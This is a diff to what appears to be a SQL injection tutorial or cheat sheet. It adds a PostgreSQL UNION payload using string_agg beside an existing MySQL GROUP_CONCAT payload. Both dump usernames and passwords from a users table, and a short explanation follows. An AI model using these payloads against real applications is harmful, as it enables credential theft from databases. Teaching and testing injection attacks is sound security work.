@@ -101,6 +101,14 @@ If the page only displays one row at a time, concatenate multiple rows into one 
 ' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--
 ```
 
+ 
+```sql
+### Use this payload for PostgreSQL
+
+
+' UNION SELECT string_agg(username || ':' || password, ','),NULL FROM users --
+```
+
 Breakdown:
 - `GROUP_CONCAT(...)` — MySQL aggregate function that merges multiple rows into a single
   string value, which is essential when the app's template only renders the first row of a
